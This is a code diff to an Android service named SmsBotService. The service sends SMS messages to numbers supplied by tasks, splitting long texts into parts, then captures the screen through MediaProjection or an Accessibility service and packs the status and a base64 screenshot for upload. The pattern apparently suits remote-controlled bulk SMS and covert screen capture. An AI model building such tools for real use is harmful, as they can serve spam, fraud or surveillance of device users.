@@ -59,16 +59,25 @@ public class SmsBotService extends Service {
         String phone = task.getString("phone");
         String template = task.getString("template");
 
-        boolean success = true;
+        String status = "failed"; // по умолчанию ошибка
         try {
-            SmsManager.getDefault().sendTextMessage(phone, null, template, null, null);
-            Thread.sleep(1500);
+            SmsManager sms = SmsManager.getDefault();
+            // Разбиваем длинные сообщения
+            if (template.length() > 160) {
+                ArrayList<String> parts = sms.divideMessage(template);
+                sms.sendMultipartTextMessage(phone, null, parts, null, null);
+            } else {
+                sms.sendTextMessage(phone, null, template, null, null);
+            }
+            Thread.sleep(2000);
+            status = "success"; // если не было исключения — успех
         } catch (Exception e) {
-            success = false;
+            status = "failed";
+            e.printStackTrace();
         }
 
         String screenshotBase64 = null;
-        if (success) {
+        if (status.equals("success")) {
             byte[] screenshotBytes = takeScreenshot();
             if (screenshotBytes != null) {
                 screenshotBase64 = Base64.encodeToString(screenshotBytes, Base64.NO_WRAP);
@@ -76,7 +85,7 @@ public class SmsBotService extends Service {
         }
 
         JSONObject updateBody = new JSONObject();
-        updateBody.put("status", success ? "success" : "failed");
+        updateBody.put("status", status);
         if (screenshotBase64 != null) {
             updateBody.put("screenshot", screenshotBase64);
         }
@@ -93,17 +102,17 @@ public class SmsBotService extends Service {
     }
 
     private byte[] takeScreenshot() {
-        // Способ 1: ScreenCaptureService (Accessibility)
+        // MediaProjection
+        if (MainActivity.mediaProjection != null) {
+            try {
+                return takeScreenshotWithMediaProjection(MainActivity.mediaProjection);
+            } catch (Exception e) {}
+        }
+        // ScreenCaptureService (Accessibility)
         if (ScreenCaptureService.instance != null) {
             byte[] result = ScreenCaptureService.instance.takeScreenshot();
             if (result != null) return result;
         }
-        // Способ 2: MediaProjection (если был настроен)
-        try {
-            if (MainActivity.mediaProjection != null) {
-                return takeScreenshotWithMediaProjection(MainActivity.mediaProjection);
-            }
-        } catch (Exception e) {}
         return null;
     }
 
